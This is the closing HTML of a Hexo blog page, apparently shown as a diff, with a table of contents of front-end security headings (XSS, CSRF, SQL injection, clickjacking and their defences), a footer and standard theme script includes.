CMD和AMD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前端安全问题"><span class="nav-number">24.</span> <span class="nav-text">前端安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本攻击（XSS）"><span class="nav-number">24.1.</span> <span class="nav-text">跨站脚本攻击（XSS）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-反射型XSS"><span class="nav-number">24.1.1.</span> <span class="nav-text">1.反射型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-持久型XSS"><span class="nav-number">24.1.2.</span> <span class="nav-text">2.持久型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Cookie劫持"><span class="nav-number">24.1.3.</span> <span class="nav-text">3.Cookie劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-XSS的防御"><span class="nav-number">24.1.4.</span> <span class="nav-text">4.XSS的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#输入检查"><span class="nav-number">24.1.4.1.</span> <span class="nav-text">输入检查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#输出检查"><span class="nav-number">24.1.4.2.</span> <span class="nav-text">输出检查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">24.2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入的防御"><span class="nav-number">24.2.1.</span> <span class="nav-text">SQL注入的防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站请求伪造（CSRF）"><span class="nav-number">24.3.</span> <span class="nav-text">跨站请求伪造（CSRF）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF的防御"><span class="nav-number">24.3.1.</span> <span class="nav-text">CSRF的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-验证码"><span class="nav-number">24.3.1.1.</span> <span class="nav-text">1.验证码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-referer检查"><span class="nav-number">24.3.1.2.</span> <span class="nav-text">2.referer检查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-Anti-CSRF-Token"><span class="nav-number">24.3.1.3.</span> <span class="nav-text">3.Anti CSRF Token</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击劫持（ClickJacking）"><span class="nav-number">24.4.</span> <span class="nav-text">点击劫持（ClickJacking）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#点击劫持的防御"><span class="nav-number">24.4.1.</span> <span class="nav-text">点击劫持的防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的防御代码"><span class="nav-number">24.5.</span> <span class="nav-text">常用的防御代码</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 &mdash; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-star"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KevinLau</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.2</div>-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
